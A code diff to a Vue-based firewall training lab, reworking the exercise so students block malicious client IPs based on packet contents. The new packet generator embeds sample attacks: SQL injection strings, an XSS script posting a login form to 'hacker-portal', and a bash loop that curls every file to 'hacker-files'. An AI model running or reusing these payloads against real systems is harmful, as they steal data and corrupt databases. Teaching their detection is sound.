@@ -13,8 +13,8 @@
             either network firewalls or host-based firewalls.
           </p>
           <p>
-            In this experiment, you will learn how to configure a firewall to block traffic from specific ports from a
-            server to a client.
+            In this experiment, you will learn how to configure a firewall to block traffic from specific IP address
+            that is sending malicious packets to a server.
           </p>
           <br>
           <div v-if="step === 1" class="content">
@@ -31,7 +31,9 @@
           <div v-if="step === 2" class="content">
             <h4>Step 2: Viewing server network information</h4>
             <p>
-              Get the interface information of the server which is in interface <span @click="copyToClipboard('GigabitEthernet0/0')" id="gigabit">"GigabitEthernet0/0"</span>. Try to find the IP
+              Get the interface information of the server which is in interface <span
+                @click="copyToClipboard('GigabitEthernet0/0')" id="gigabit">"GigabitEthernet0/0"</span>. Try to find the
+              IP
               address of the server using the following command:
             </p>
             <br>
@@ -62,18 +64,16 @@
             <p>
               Access lists are a set of rules that are used to filter traffic. Modify the access list to block and allow
               traffic from specific ports from a server to a client. Towards the right side of this experiment you will
-              see a list of packets labelled in Red and Green. The Red packets are the packets that are blocked by the
-              firewall and the Green packets are the packets that are allowed by the firewall. Use the ports mentioned
-              in packet list to modify the access list accordingly.
+              see a list of packets. The packets are sent from a client to a server. The packets hold an IP address and it's packet content. Click on the packet to view the complete packet content and decide which packets to block and allow based on the packet content. Malicious packets usually hold SQL Injection code or XSS scripts or Bash Scripts. You can block these packets by blocking the IP Address from which the packets are sent. Use the below commands to do so.
             </p>
             <br>
             <p>
-              Use the following command to block traffic of tcp packets from a specific port to the server:
+              Use the following command to block traffic of tcp packets from a specific Client IP Address to the server:
             </p>
             <div class="code">
               <code
-                  @click="copyToClipboard('access-list block-packet deny tcp any host SERVER_IP_ADDRESS eq PORT_NUMBER')">access-list
-                block-packet deny tcp any host SERVER_IP_ADDRESS eq PORT_NUMBER
+                  @click="copyToClipboard('access-list block-packet deny tcp CLIENT_IP_ADDRESS host SERVER_IP_ADDRESS')">access-list
+                block-packet deny tcp CLIENT_IP_ADDRESS host SERVER_IP_ADDRESS
               </code>
             </div>
             <br>
@@ -82,8 +82,8 @@
             </p>
             <div class="code">
               <code
-                  @click="copyToClipboard('access-list allow-packet allow tcp any host SERVER_IP_ADDRESS eq PORT_NUMBER')">access-list
-                allow-packet allow tcp any host SERVER_IP_ADDRESS eq PORT_NUMBER
+                  @click="copyToClipboard('access-list allow-packet allow tcp CLIENT_IP_ADDRESS host SERVER_IP_ADDRESS')">access-list
+                allow-packet allow tcp CLIENT_IP_ADDRESS host SERVER_IP_ADDRESS
               </code>
             </div>
             <p>
@@ -91,8 +91,8 @@
               commands. In the commands, allow-packet and block-packet are the names of the access lists that you want
               to modify, these
               are existing access lists, creation of new access-list is restricted for this experiment. The
-              SERVER_IP_ADDRESS is the IP address of the server and the PORT_NUMBER is
-              the port number from which you want to block traffic, refer to the packet list to find the port numbers
+              SERVER_IP_ADDRESS is the IP address of the server and the CLIENT_IP_ADDRESS is
+              the client IP address from which you want to block traffic, refer to the packet list to find the IP address numbers
               and the output of the second step to find the IP address of the server.
             </p>
             <StyledButton text="Verify Rules" :disable="disableButton" @click="verify"></StyledButton>
@@ -127,10 +127,11 @@
               <div class="packet-wrapper" v-for="(data, index) in packets" :key="index"
                    :style="{backgroundColor: getPacketWrapperColor(data.packetStatus), boxShadow: currentPacketIndex === index ? `0px 4px 20px #0077ff` : '', border: currentPacketIndex === index ? `4px solid #0077ff` : ''}">
                 <span class="packet-index"
-                      :style="{backgroundColor: data.packetStatus === 'COMPLETE' ? '#b0b0b0' : data.packetStatus === 'DISCARD' ? '#ff8484' : '#5bb644'}">{{
+                      :style="{backgroundColor: data.packetStatus === 'COMPLETE' ? '#b0b0b0' : '#5bb644'}">{{
                     index
                   }}</span>
-                <PackageComponent :data="[data.data, 'Port: ' + data.port]"
+                <PackageComponent :data="[data.ipAddress, data.data.slice(0, 10) + '...']"
+                                  :data-on-click="[data.data]"
                                   :background-color="data.packetStatus === 'COMPLETE' ? '#d7d7d7' : data.backgroundColor"></PackageComponent>
               </div>
             </div>
@@ -185,83 +186,31 @@ export default {
     this.$refs.childComponentRef.drawLine("firewall", "server", "", "allowed packet");
     this.$refs.childComponentRef.drawLine("trash", "firewall", "", "discarded packet");
     this.$refs.childComponentRef.drawLine("client", "firewall", "", "incoming packet");
-    this.packets.forEach((packet) => {
-      if (Math.random() > 0.5) {
-        packet.packetStatus = "DISCARD";
-      }
-    });
-    //create a copy of the packets array to packetsCopy
-    this.packetsCopy = JSON.parse(JSON.stringify(this.packets));
+    this.generateRandomPackets()
+
+    for (const [key, value] of Object.entries(this.packetConfig)) {
+      console.log(key);
+      console.log(value.data);
+      console.log(value.accessGroup);
+      this.packets.push({
+        data: value.data,
+        ipAddress: key,
+        packetStatus: 'INCOMPLETE',
+        malicious: value.malicious,
+      })
+    }
   },
   data() {
     return {
       step: 1,
       disableButton: false,
       serverIpAddress: '',
-      packetConfig: {
-        80: {packet: "HTTP", accessGroup: "allow-packet"},
-        443: {packet: "HTTPS ", accessGroup: "allow-packet"},
-        21: {packet: "FTP (control) ", accessGroup: "allow-packet"},
-        20: {packet: "FTP (data) ", accessGroup: "allow-packet"},
-        22: {packet: "SSH ", accessGroup: "allow-packet"},
-        23: {packet: "Telnet ", accessGroup: "allow-packet"},
-        25: {packet: "SMTP ", accessGroup: "allow-packet"},
-        53: {packet: "DNS ", accessGroup: "allow-packet"},
-      },
+      packetConfig: {},
       terminalStarterText: "ciscoasa> ",
       terminal: [],
       currentPacketIndex: -1,
       terminalInput: '',
-      packets: [
-        {
-          packetStatus: "ALLOW",
-          data: "HTTP",
-          port: 80,
-          backgroundColor: "#ABFF8E"
-        },
-        {
-          packetStatus: "ALLOW",
-          data: "HTTPS",
-          port: 443,
-          backgroundColor: "#8EF3FF"
-        },
-        {
-          packetStatus: "ALLOW",
-          data: "FTP (control)",
-          port: 21,
-          backgroundColor: "#ff8e8e"
-        },
-        {
-          packetStatus: "ALLOW",
-          data: "FTP (data)",
-          port: 20,
-          backgroundColor: "#8eeaff"
-        },
-        {
-          packetStatus: "ALLOW",
-          data: "SSH",
-          port: 22,
-          backgroundColor: "#FFE68E"
-        },
-        {
-          packetStatus: "ALLOW",
-          data: "Telnet",
-          port: 23,
-          backgroundColor: "#ff8ef6"
-        },
-        {
-          packetStatus: "ALLOW",
-          data: "SMTP",
-          port: 25,
-          backgroundColor: "#FFAB8E"
-        },
-        {
-          packetStatus: "ALLOW",
-          data: "DNS",
-          port: 53,
-          backgroundColor: "#FFAB8E"
-        },
-      ],
+      packets: [],
       packetsCopy: [],
       packetAnimationList: [{
         packageId: 'package01',
@@ -273,21 +222,118 @@ export default {
     }
   },
   methods: {
+    resetPacketIndex() {
+      //set all packets to incomplete
+      this.packets.forEach((packet) => {
+        packet.packetStatus = 'INCOMPLETE';
+      })
+    },
+    generateRandomIP() {
+      return Math.floor(Math.random() * 255) + "." + Math.floor(Math.random() * 255) + "." + Math.floor(Math.random() * 255) + "." + Math.floor(Math.random() * 255);
+    },
+    generateRandomPackets() {
+      for (let i = 0; i < 6; i++) {
+        let randomValue = Math.random();
+        let randomIP = this.generateRandomIP();
+        if (randomValue > 0.5) {
+          let randomValueForCommand = Math.random();
+          let packetContent = "";
+
+          if (randomValueForCommand > 0.3 && randomValueForCommand < 0.5) {
+            packetContent = "SELECT * FROM users WHERE username = 'admin' OR 1=1 --' AND password = 'admin'";
+          } else if (randomValueForCommand > 0.5 && randomValueForCommand < 0.7) {
+            packetContent = "<script>" +
+                "let value = document.getElementById('login-form').value" +
+                " fetch('http://hacker-portal:3000', {method: 'POST', body: value})" +
+                //eslint-disable-next-line
+                "<\/script>";
+          } else if (randomValueForCommand > 0.7 && randomValueForCommand < 0.9) {
+            packetContent = "#!/bin/bash\n" +
+                "for file in *\n" +
+                "do\n" +
+                "    if [[ -f $file ]]; then\n" +
+                "        content=$(cat \"$file\")\n" +
+                "        curl -X POST -d \"$content\" http://hacker-files:8080\n" +
+                "    fi\n" +
+                "done\n";
+          } else if (randomValueForCommand > 0.9 && randomValueForCommand < 0.95) {
+            packetContent = "DELETE FROM users WHERE username = 'admin' OR 1=1 --' AND password = 'admin'";
+          } else if (randomValueForCommand < 0.3 && randomValueForCommand > 0.1) {
+            packetContent = "UPDATE users SET password = 'admin' WHERE username = 'admin' OR 1=1 --'";
+          } else if (randomValueForCommand < 0.1) {
+            packetContent = "INSERT INTO users VALUES ('admin', 'admin')";
+          } else {
+            packetContent = "SELECT * FROM users WHERE username = 'admin' AND password = 'admin'";
+          }
+
+          this.packetConfig[randomIP] = {
+            accessGroup: "allow-packet",
+            data: packetContent,
+            malicious: true
+          }
+        } else {
+          let packetData = ''
+
+          let randomValueForCommand = Math.random();
+
+          if (randomValueForCommand > 0.3 && randomValueForCommand < 0.5) {
+            packetData = "HTTP/1.1 200 OK\n" +
+                "Date: Mon, 27 Jul 2023 00:09:11 GMT\n" +
+                "Server: Apache/2.2.14 (Win32)\n" +
+                "Last-Modified: Wed, 22 Jul 2009 19:15:56 GMT\n" +
+                "Content-Length: 88\n" +
+                "Content-Type: text/html\n" +
+                "Connection: Closed\n" +
+                "\n" +
+                "<html>\n" +
+                "<body>\n" +
+                "<h1>Hello, World!</h1>\n" +
+                "</body>\n" +
+                "</html>\n";
+            //dont print Hello World
+          } else if (randomValueForCommand > 0.5 && randomValueForCommand < 0.7) {
+            packetData = "This is a simple text message";
+          } else if (randomValueForCommand > 0.7 && randomValueForCommand < 0.9) {
+            packetData = 'This is a very normal text message'
+          } else if (randomValueForCommand > 0.9 && randomValueForCommand < 0.95) {
+            packetData = "HTTPS/1.1 200 OK\n" +
+                "Date: Mon, 27 Jul 2009 04:20:06:09 GMT\n" +
+                "Content-Type: text/html\n" +
+                "Connection: Closed\n" +
+                "\n" +
+                "Text message";
+          } else if (randomValueForCommand < 0.3 && randomValueForCommand > 0.1) {
+            packetData = "Hello World";
+          } else if (randomValueForCommand < 0.1) {
+            packetData = "This is a normal packet";
+          } else {
+            packetData = "This is a normal packet";
+          }
+
+          packetData += "\n"
+          for (let i = 0; i < 10; i++) {
+            packetData += String.fromCharCode(Math.floor(Math.random() * 26) + 97);
+          }
+          this.packetConfig[randomIP] = {
+            accessGroup: "allow-packet",
+            data: packetData,
+            malicious: false
+          }
+        }
+      }
+      console.log(this.packetConfig)
+    },
     verify() {
       this.verifyRecursive(0);
-    },
-    resetPacketIndex() {
-      this.packets = JSON.parse(JSON.stringify(this.packetsCopy));
     },
     verifyRecursive(i) {
       this.currentPacketIndex = i;
       this.packetAnimationList[0].displayPackage = true
 
       let packetVerified = this.packets[i]
-      let packetConfig = this.packetConfig[packetVerified.port]
+      let packetConfig = this.packetConfig[packetVerified.ipAddress]
 
-      this.packetAnimationList[0].data = [packetVerified.data, packetVerified.port]
-      this.packetAnimationList[0].packageBackgroundColor = packetVerified.backgroundColor
+      this.packetAnimationList[0].data = [packetVerified.ipAddress, packetConfig.data.slice(0, 10) + '...']
 
       if (i > 0) {
         this.packets[i - 1].packetStatus = "COMPLETE";
@@ -298,7 +344,7 @@ export default {
           this.$refs.childComponentRef.animatePackage("trash", "package01", "firewall", () => {
             this.disableButton = false
             this.packetAnimationList[0].displayPackage = false
-            if (packetVerified.packetStatus === "DISCARD") {
+            if (packetVerified.malicious === true) {
               if (i < this.packets.length - 1) {
                 this.verifyRecursive(i + 1);
               }
@@ -317,7 +363,7 @@ export default {
           this.$refs.childComponentRef.animatePackage("server", "package01", "firewall", () => {
             this.disableButton = false
             this.packetAnimationList[0].displayPackage = false
-            if (packetVerified.packetStatus === "ALLOW") {
+            if (packetVerified.malicious === false) {
               if (i < this.packets.length - 1) {
                 this.verifyRecursive(i + 1);
               }
@@ -325,6 +371,7 @@ export default {
                 this.packets[i].packetStatus = "COMPLETE";
                 if (this.packets.every(packet => packet.packetStatus === "COMPLETE")) {
                   this.correct1("All packets have been verified")
+                  this.resetPacketIndex()
                 }
               }
             } else {
@@ -385,7 +432,7 @@ export default {
           this.terminal.push(this.terminalStarterText);
         } else if (this.terminalStarterText === "ciscoasa(config)# ") {
 
-          let matchForCommand = text.match(/access-list (\w+-?\w*) (allow|deny) (tcp|udp) (any|\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}) host (\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}) eq (\d+)/)
+          let matchForCommand = text.match(/access-list (\w+-?\w*) (allow|deny) (tcp|udp) (any|\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}) host (\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/)
 
           if (text.match(/show interface\s.+/g)) {
             const interfaceName = text.split(" ")[2];
@@ -418,11 +465,11 @@ export default {
           } else if (text === "show access-lists") {
             Object.entries(this.packetConfig).forEach(([key, value]) => {
               if (value.accessGroup === 'allow-packet') {
-                this.terminal.push(`Standard IP access list allow-${value.packet}`)
-                this.terminal.push("10 permit allow-packet any host " + this.serverIpAddress + " eq " + key);
+                this.terminal.push(`Standard IP access list allow-all`)
+                this.terminal.push("10 permit allow-packet " + key + " host " + this.serverIpAddress);
               } else if (value.accessGroup === 'block-packet') {
-                this.terminal.push(`Standard IP access list block-${value.packet}`)
-                this.terminal.push("10 deny block-packet any host " + this.serverIpAddress + " eq " + key);
+                this.terminal.push(`Standard IP access list block-all`)
+                this.terminal.push("10 deny block-packet " + key + " host " + this.serverIpAddress);
               }
             })
 
@@ -430,53 +477,72 @@ export default {
               this.step = 4;
             }
           } else if (matchForCommand) {
-            const [regex, accessListName, type, protocol, source, destination, port] = matchForCommand
+            const [regex, accessListName, type, protocol, source, destination] = matchForCommand
             console.log(regex)
             console.log('Access List Name:', accessListName);
             console.log('Type:', type);
             console.log('Protocol:', protocol);
             console.log('Source:', source);
             console.log('Destination:', destination);
-            console.log('Port:', port);
             console.log('Packet Config:', this.packetConfig);
 
             if (this.serverIpAddress !== destination) {
               this.terminal.push("Destination IP address not found.");
               return;
             }
-            if (source !== 'any') {
-              this.terminal.push("Please allow allow incoming traffic for all IP addresses.");
-              return;
-            }
+
             if (protocol !== 'tcp') {
               this.terminal.push("Only TCP protocol is allowed.");
               return;
             }
 
-            if (this.packetConfig[port]) {
-              if (accessListName === 'allow-packet' && type === 'allow') {
-                this.packetConfig[port].accessGroup = 'allow-packet';
-              } else if (accessListName === 'block-packet' && type === 'deny') {
-                this.packetConfig[port].accessGroup = 'block-packet';
-              } else {
-                this.terminal.push("Access group " + accessListName + " not found for " + type + " does not exist.");
+            if (source === 'any') {
+              //iterate through all clients and set access group to block-packet or allow-packet based on type
+              if(type === 'allow'){
+                this.terminal.push("Setting allow rule to all clients for allow-packet group.");
+              }
+              else{
+                this.terminal.push("Setting deny rule to all clients for block-packet group.");
+              }
+              Object.entries(this.packetConfig).forEach(([key]) => {
+                if (accessListName === 'allow-packet' && type === 'allow') {
+                  this.packetConfig[key].accessGroup = 'allow-packet';
+                } else if (accessListName === 'block-packet' && type === 'deny') {
+                  this.packetConfig[key].accessGroup = 'block-packet';
+                } else {
+                  this.terminal.push("Access group " + accessListName + " not found for " + type + " does not exist.");
+                }
+              })
+            }
+            else{
+              if (this.packetConfig[source]) {
+                if (accessListName === 'allow-packet' && type === 'allow') {
+                  this.packetConfig[source].accessGroup = 'allow-packet';
+                  this.terminal.push("Setting allow rule to " + source + " for allow-packet group.");
+                } else if (accessListName === 'block-packet' && type === 'deny') {
+                  this.packetConfig[source].accessGroup = 'block-packet';
+                  this.terminal.push("Setting deny rule to " + source + " for block-packet group.");
+                } else {
+                  this.terminal.push("Access group " + accessListName + " not found for " + type + " does not exist.");
+                }
+              }
+              else{
+                this.terminal.push("Source IP address not found.");
               }
             }
+
           } else {
             this.terminal.push(this.terminalStarterText + "Invalid input detected.");
           }
-        }
-        else{
+        } else {
           this.terminal.push(this.terminalStarterText + "Invalid input detected.");
         }
       }
     },
     getPacketWrapperColor(packetStatus) {
       switch (packetStatus) {
-        case "ALLOW":
-          return "#11ff00";
-        case "DISCARD":
-          return "#ff0027";
+        case "INCOMPLETE":
+          return "#e2ffd6";
         case "COMPLETE":
           return "#eaeaea";
         default:
@@ -594,11 +660,12 @@ div {
   box-sizing: border-box;
 }
 
-#gigabit{
+#gigabit {
   padding: 0;
   margin: 0;
   display: inline-block;
 }
+
 #gigabit:hover {
   cursor: copy;
 }
